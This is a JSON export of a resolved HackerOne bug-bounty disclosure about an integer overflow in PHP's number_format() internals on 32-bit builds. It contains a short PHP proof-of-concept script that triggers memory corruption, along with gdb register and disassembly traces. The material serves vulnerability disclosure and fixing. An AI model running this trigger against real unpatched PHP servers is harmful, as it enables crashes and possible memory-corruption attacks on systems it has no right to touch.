{
  "id": 180562,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1NjI=",
  "url": "https://hackerone.com/reports/180562",
  "title": "Memory corruption in _php_math_number_format_ex()",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2016-11-07T01:47:13.948Z",
  "submitted_at": "2016-11-07T01:47:13.948Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fosec",
    "url": "/fosec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ILJLE6S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122649Z&X-Amz-Expires=1793&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJPm2BocKwYVHq6OvXN7Sjam7eo%2BSIxzA09VW0AVbp2gIhAJSEEdx%2Bwdp3lk64VEqNkIYIhXx%2FxKFpBdSyuvKn3uDQKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgwDahPqWWM9RqpHhfIqjwWks8v1jlby6TsImaMYsudHHbH1Wx6QSFFy8DYbsq4sdNBOEyl9ATKaXjCK28W3pUZj7TyOZVii2jhReFgA81tdYD5PFfaf5uIAxYqN97CUjE9tYuC42DG8AfHfqoUrQSIYfsELneF%2FrwPpYOjej6pbEuJZgC5M%2FMSNXxJ9AkJT8ulcJ7ug2u26Vej6laJdmacOPyHhTSDRKqZ8bmU2qZkHjpllBjac8S0jwAJ%2FXOU29NjYq0HDmzg%2FtCQVuok6OwzgDb5hbqWacuN1sxtQGmO9mkyNT4Jw9z%2F%2FM2jKe5Ofp7a%2BsW7M29sPZWBmYpMpm8g2vSNBkxTCySmUy56WR33dkSWPoBYsFBFRxV0i7fuZNan6wwqSXVqlsDGcF4MC3juEMfOmDXorpSY3GLJ%2FVwB%2Fj80Xv6a%2Bp7E%2Bz60vHuZPKRdWwdUIM1%2FbZuj9lLL0UDjQ8xpD%2Bn0FK1fiDxHk1SpOsDjzEP1WahBgmwofMy3D1wpHA5KqDWaKaVFS70XROakujpAfdyfQE5PP6LUnATbGHMnn1bUwhuc0l2VVsshmhKcQ3B5C%2Br3sjG3Hmc9awv6w5zgQBLzR5VleYsLEogGPGtoOncfnHncG8bFUQeNJ22mQ5IuXzbJgMrGIr0P2mvs9lAWFZg6lDLV4JH5vHDviIh7FgcYJUEIkC%2FASSSfJ4S%2F1zmeydCzaoMWM1qaEMyyUrSw34Rs%2FNYdwqtXkMGgT8i40ddZ1ExgLoiuYapUfOH5SmgiRbbREJwXv%2FHCtjdpSUHP9m9syQLajUPFrc65NAq0WB5qVPRHnYKkJmfEG1uUTPQG95vZJq9AQRivJGj4HDlBYWgll%2B9E5Nd9B68J7QKUpyIIN7ophw%2FbOBQN8MMaXrK4GOrABPy7xOWyZjlcC8oDrt3gIH%2BpFpbBCNRA1BmLMfIgaiBMP5w4F8eLFwLZvlKhnztuddGA6O4Uh8OLKOQ2aMk5lW1Xis4FfdDyGJM6fgZBIafAGSXYrAN8T%2FOBBirnmKH3TipDF3gxk1HBgavZXNceHqfYGjmJlFOMF6p%2B60lxNvCERqm7z1BwOfKyvtKJeK4bvct0t59UMTMS%2FtySInE4heSVeslW4qBd%2FQRC4aXxUgJY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=555dd770abb3282c3539cf6fe879623ced7d461cdcd591a404bc37a0c0d986f5",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ILJLE6S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122649Z&X-Amz-Expires=1793&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJPm2BocKwYVHq6OvXN7Sjam7eo%2BSIxzA09VW0AVbp2gIhAJSEEdx%2Bwdp3lk64VEqNkIYIhXx%2FxKFpBdSyuvKn3uDQKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgwDahPqWWM9RqpHhfIqjwWks8v1jlby6TsImaMYsudHHbH1Wx6QSFFy8DYbsq4sdNBOEyl9ATKaXjCK28W3pUZj7TyOZVii2jhReFgA81tdYD5PFfaf5uIAxYqN97CUjE9tYuC42DG8AfHfqoUrQSIYfsELneF%2FrwPpYOjej6pbEuJZgC5M%2FMSNXxJ9AkJT8ulcJ7ug2u26Vej6laJdmacOPyHhTSDRKqZ8bmU2qZkHjpllBjac8S0jwAJ%2FXOU29NjYq0HDmzg%2FtCQVuok6OwzgDb5hbqWacuN1sxtQGmO9mkyNT4Jw9z%2F%2FM2jKe5Ofp7a%2BsW7M29sPZWBmYpMpm8g2vSNBkxTCySmUy56WR33dkSWPoBYsFBFRxV0i7fuZNan6wwqSXVqlsDGcF4MC3juEMfOmDXorpSY3GLJ%2FVwB%2Fj80Xv6a%2Bp7E%2Bz60vHuZPKRdWwdUIM1%2FbZuj9lLL0UDjQ8xpD%2Bn0FK1fiDxHk1SpOsDjzEP1WahBgmwofMy3D1wpHA5KqDWaKaVFS70XROakujpAfdyfQE5PP6LUnATbGHMnn1bUwhuc0l2VVsshmhKcQ3B5C%2Br3sjG3Hmc9awv6w5zgQBLzR5VleYsLEogGPGtoOncfnHncG8bFUQeNJ22mQ5IuXzbJgMrGIr0P2mvs9lAWFZg6lDLV4JH5vHDviIh7FgcYJUEIkC%2FASSSfJ4S%2F1zmeydCzaoMWM1qaEMyyUrSw34Rs%2FNYdwqtXkMGgT8i40ddZ1ExgLoiuYapUfOH5SmgiRbbREJwXv%2FHCtjdpSUHP9m9syQLajUPFrc65NAq0WB5qVPRHnYKkJmfEG1uUTPQG95vZJq9AQRivJGj4HDlBYWgll%2B9E5Nd9B68J7QKUpyIIN7ophw%2FbOBQN8MMaXrK4GOrABPy7xOWyZjlcC8oDrt3gIH%2BpFpbBCNRA1BmLMfIgaiBMP5w4F8eLFwLZvlKhnztuddGA6O4Uh8OLKOQ2aMk5lW1Xis4FfdDyGJM6fgZBIafAGSXYrAN8T%2FOBBirnmKH3TipDF3gxk1HBgavZXNceHqfYGjmJlFOMF6p%2B60lxNvCERqm7z1BwOfKyvtKJeK4bvct0t59UMTMS%2FtySInE4heSVeslW4qBd%2FQRC4aXxUgJY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f8ac3528320c49432ff8605628a375fe2d0f7236ba52aa1264e071b7743bb47"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:21:52.975Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:21:49.528Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The fix of this bug has been committed: https://bugs.php.net/bug.php?id=73336\nDescription:\n--------------\nI have found some vulnerable code at ```_php_math_number_format_ex()``` function. ```_php_math_number_format_ex()``` function is an internal function which is called from ```number_format()``` function. ```number_format()``` function takes in a string and uses it as the thousand separator. If the separator string is too long, it may lead to string overflow.\n\nInside the code of the function itself, there are checks in the *thousand_sep_len* to avoid string overflow:\n\n``` c\nPHPAPI zend_string *_php_math_number_format_ex(double d, int dec, char *dec_point,\n\t\tsize_t dec_point_len, char *thousand_sep, size_t thousand_sep_len)\n{\n....\n    /* allow for thousand separators */\n\tif (thousand_sep) {\n\t\tif (integral + thousand_sep_len * ((integral-1) / 3) < integral) {\n\t\t\t/* overflow */\n\t\t\tphp_error_docref(NULL, E_ERROR, \"String overflow\");\n\t\t}\n\t\tintegral += thousand_sep_len * ((integral-1) / 3);\n\t}\n\n    reslen = integral;\n....\n}\n```\n\nThe problem is that both *integral* variable and *thousand_sep_len* variable are unsigned integers, in 32 bits architectures this means 2^32 - 1 maximum value. So, if we set some appropriate values in *integral* and *thousand_sep_len*, for example: integral = 0x0a and thousand_sep_len = 0x65000000, ```integral + thousand_sep_len * ((integral-1) / 3)``` equals to 0x12F00000a, a result larger than the maximum representable value. In 32 bits architectures, the result will become 0x2F00000a and pass the check.\n\n\nTest script:\n----------------\n``` php\n<?php\nini_set('memory_limit', -1);\n$thousands_sep = str_repeat(\"A\", 0x65000000);\nnumber_format(1234567890, 0, \".\", $thousands_sep);\n?>\n```\nOpen php program in gdb, set a breakpoint at line *1149* in file ```ext/standard/math.c```\n\n```\n[----------------------------------registers-----------------------------------]\nEAX: 0x2f00000a ('\\n')\nEBX: 0x52400010 ('A' <repeats 200 times>...)\nECX: 0xb7da8000 --> 0x1b8d9c\nEDX: 0x2f000000 ('')\nESI: 0x65000000 ('A' <repeats 200 times>...)\nEDI: 0xb7860188 --> 0x848b04e (<ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER>:      push   ebp)\nEBP: 0xbfffbe88 --> 0xbfffbf28 --> 0xbfffbf68 --> 0xbfffbf88 --> 0xbfffbfc8 --> 0xbfffbff8 (--> ...)\nESP: 0xbfffbe30 --> 0x0\nEIP: 0x834d202 (<_php_math_number_format_ex+316>:       cmp    eax,DWORD PTR [ebp-0x18])\nEFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d1fd <_php_math_number_format_ex+311>:  mov    eax,DWORD PTR [ebp-0x18]\n   0x834d200 <_php_math_number_format_ex+314>:  add    eax,edx\n   0x834d202 <_php_math_number_format_ex+316>:  cmp    eax,DWORD PTR [ebp-0x18]\n=> 0x834d205 <_php_math_number_format_ex+319>:  jae    0x834d223 <_php_math_number_format_ex+349>\n | 0x834d207 <_php_math_number_format_ex+321>:  mov    DWORD PTR [esp+0x8],0x89758e9\n | 0x834d20f <_php_math_number_format_ex+329>:  mov    DWORD PTR [esp+0x4],0x1\n | 0x834d217 <_php_math_number_format_ex+337>:  mov    DWORD PTR [esp],0x0\n | 0x834d21e <_php_math_number_format_ex+344>:  call   0x83c1a10 <php_error_docref0>\n |->   0x834d223 <_php_math_number_format_ex+349>:      mov    eax,DWORD PTR [ebp-0x18]\n       0x834d226 <_php_math_number_format_ex+352>:      sub    eax,0x1\n       0x834d229 <_php_math_number_format_ex+355>:      mov    edx,0xaaaaaaab\n       0x834d22e <_php_math_number_format_ex+360>:      mul    edx\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbe30 --> 0x0\n0004| 0xbfffbe34 --> 0x89758e1 (\"%.*F\")\n0008| 0xbfffbe38 --> 0x0\n0012| 0xbfffbe3c --> 0xb4800000 ('A' <repeats 200 times>...)\n0016| 0xbfffbe40 --> 0x41d26580\n0020| 0xbfffbe44 --> 0x65000014 ('A' <repeats 200 times>...)\n0024| 0xbfffbe48 --> 0xb4800000 ('A' <repeats 200 times>...)\n0028| 0xbfffbe4c --> 0x41d26580\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d202      1150                    if (integral + thousand_sep_len * ((integral-1) / 3) < integral) {\ngdb-peda$\n```\n\n```DWORD PTR [ebp-0x18]``` is *integral* variable and EAX register will hold result of ```integral + thousand_sep_len * ((integral-1) / 3)``` . Because *integral* is lower than 0x2f00000a, *integral* will be updated with 0x2f00000a. *reslen* will be 0x2f00000a. \n\n*reslen* is used as a parameter in ```zend_string_alloc()``` to create a new zend_string object holding formatted string ( reffer at ```ext/standard/math.c:1175``` ):\n``` c\n\tres = zend_string_alloc(reslen, 0);\n```\n\nTwo local variables *s* and *t* are used during format process. They are used to copy numbers to formatted string and add thousand separator every three digits ( reffer at ```ext/standard/math.c:1209``` ):\n```c\n/* copy the numbers before the decimal point, adding thousand\n\t * separator every three digits */\n\twhile (s >= ZSTR_VAL(tmpbuf)) {\n\t\t*t-- = *s--;\n\t\tif (thousand_sep && (++count%3)==0 && s >= ZSTR_VAL(tmpbuf)) {\n\t\t\tt -= thousand_sep_len;\n\t\t\tmemcpy(t + 1, thousand_sep, thousand_sep_len);\n\t\t}\n}\n```\n\nBecause *thousand_sep_len* is too big,  the result of ```t -= thousand_sep_len;``` is unexpected value.\nIn this example, ```$ebp-0x10``` points to *t*.\n\nBefore\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x9b000000 ('A' <repeats 200 times>...)\nEBX: 0x52400010 ('A' <repeats 200 times>...)\nEFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d3d9 <_php_math_number_format_ex+787>:  ja     0x834d3ff <_php_math_number_format_ex+825>\n   0x834d3db <_php_math_number_format_ex+789>:  mov    eax,DWORD PTR [ebp+0x20]\n   0x834d3de <_php_math_number_format_ex+792>:  neg    eax\n=> 0x834d3e0 <_php_math_number_format_ex+794>:  add    DWORD PTR [ebp-0x10],eax\n   0x834d3e3 <_php_math_number_format_ex+797>:  mov    eax,DWORD PTR [ebp-0x10]\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d3e0      1213                            t -= thousand_sep_len;\ngdb-peda$ x/1xw $ebp-0x10\n0xbfffbe78:     0x52200016\n```\nAfter:\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x9b000000 ('A' <repeats 200 times>...)\nEBX: 0x52400010 ('A' <repeats 200 times>...)\n[-------------------------------------code-------------------------------------]\n   0x834d3db <_php_math_number_format_ex+789>:  mov    eax,DWORD PTR [ebp+0x20]\n   0x834d3de <_php_math_number_format_ex+792>:  neg    eax\n   0x834d3e0 <_php_math_number_format_ex+794>:  add    DWORD PTR [ebp-0x10],eax\n=> 0x834d3e3 <_php_math_number_format_ex+797>:  mov    eax,DWORD PTR [ebp-0x10]\n   0x834d3e6 <_php_math_number_format_ex+800>:  lea    edx,[eax+0x1]\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, _php_math_number_format_ex (d=1234567890, dec=0x0, dec_point=0xb78012b8 \".\",\n    dec_point_len=0x1, thousand_sep=0x52400010 'A' <repeats 200 times>...,\n    thousand_sep_len=0x65000000) at /root/fuzzer/php7/ext/standard/math.c:1214\n1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);\ngdb-peda$ x/1xw $ebp-0x10\n0xbfffbe78:     0xed200016\n```\n\n0xed200016 is an unusable memory address. \n\n```_php_math_number_format_ex``` function tries to copy thousand separator into formatted string, leads to memory corruption ( reffer at ```ext/standard/math.c:1214``` ):\n``` c\nmemcpy(t + 1, thousand_sep, thousand_sep_len);\n```\n\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x52400010 ('A' <repeats 200 times>...)\nEBX: 0x52400010 ('A' <repeats 200 times>...)\nECX: 0x0\nEDX: 0xed200017\nESI: 0x65000000 ('A' <repeats 200 times>...)\nEDI: 0xb7860188 --> 0x848b04e (<ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER>:      push   ebp)\nEBP: 0xbfffbe88 --> 0xbfffbf28 --> 0xbfffbf68 --> 0xbfffbf88 --> 0xbfffbfc8 --> 0xbfffbff8 (--> ...)\nESP: 0xbfffbe30 --> 0xed200017\nEIP: 0x834d3fa (<_php_math_number_format_ex+820>:       call   0x80647f0 <memcpy@plt>)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d3f0 <_php_math_number_format_ex+810>:  mov    eax,DWORD PTR [ebp+0x1c]\n   0x834d3f3 <_php_math_number_format_ex+813>:  mov    DWORD PTR [esp+0x4],eax\n   0x834d3f7 <_php_math_number_format_ex+817>:  mov    DWORD PTR [esp],edx\n=> 0x834d3fa <_php_math_number_format_ex+820>:  call   0x80647f0 <memcpy@plt>\n   0x834d3ff <_php_math_number_format_ex+825>:  mov    eax,DWORD PTR [ebp-0x2c]\n   0x834d402 <_php_math_number_format_ex+828>:  add    eax,0x10\n   0x834d405 <_php_math_number_format_ex+831>:  cmp    eax,DWORD PTR [ebp-0xc]\n   0x834d408 <_php_math_number_format_ex+834>:  jbe    0x834d38e <_php_math_number_format_ex+712>\nGuessed arguments:\narg[0]: 0xed200017\narg[1]: 0x52400010 ('A' <repeats 200 times>...)\narg[2]: 0x65000000 ('A' <repeats 200 times>...)\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbe30 --> 0xed200017\n0004| 0xbfffbe34 --> 0x52400010 ('A' <repeats 200 times>...)\n0008| 0xbfffbe38 --> 0x65000000 ('A' <repeats 200 times>...)\n0012| 0xbfffbe3c --> 0xb4800000 ('A' <repeats 200 times>...)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d3fa      1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);\ngdb-peda$\n```\n\nExpected result:\n----------------\nNo SIGSEGV\n\nActual result:\n--------------\nSIGSEGV",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:21:49.616Z",
  "allow_singular_disclosure_after": -134276699.8161427,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
